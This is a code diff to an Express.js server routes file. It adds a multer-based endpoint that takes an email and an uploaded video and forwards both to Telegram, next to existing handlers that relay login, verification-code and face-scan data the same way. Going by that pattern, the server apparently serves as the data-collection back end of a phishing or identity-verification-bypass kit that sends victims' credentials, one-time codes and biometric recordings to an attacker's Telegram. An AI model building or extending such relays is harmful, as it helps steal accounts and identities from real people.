@@ -1,11 +1,15 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
+import multer from "multer";
 import { 
   sendLoginNotification, 
   sendCodeNotification, 
-  sendFaceScanNotification
+  sendFaceScanNotification,
+  sendVideoNotification
 } from "./telegram";
+
+const upload = multer({ storage: multer.memoryStorage() });
 
 export async function registerRoutes(
   httpServer: Server,
@@ -61,6 +65,24 @@ export async function registerRoutes(
     } catch (error) {
       console.error("Error sending face scan notification:", error);
       res.status(500).json({ message: "Failed to send notification" });
+    }
+  });
+  
+  // Video upload
+  app.post("/api/telegram/video", upload.single('video'), async (req, res) => {
+    try {
+      const { email } = req.body;
+      const videoFile = req.file;
+      
+      if (!email || !videoFile) {
+        return res.status(400).json({ message: "Email and video are required" });
+      }
+      
+      await sendVideoNotification(email, videoFile.buffer);
+      res.json({ success: true, message: "Video sent to Telegram" });
+    } catch (error) {
+      console.error("Error sending video:", error);
+      res.status(500).json({ message: "Failed to send video" });
     }
   });
   
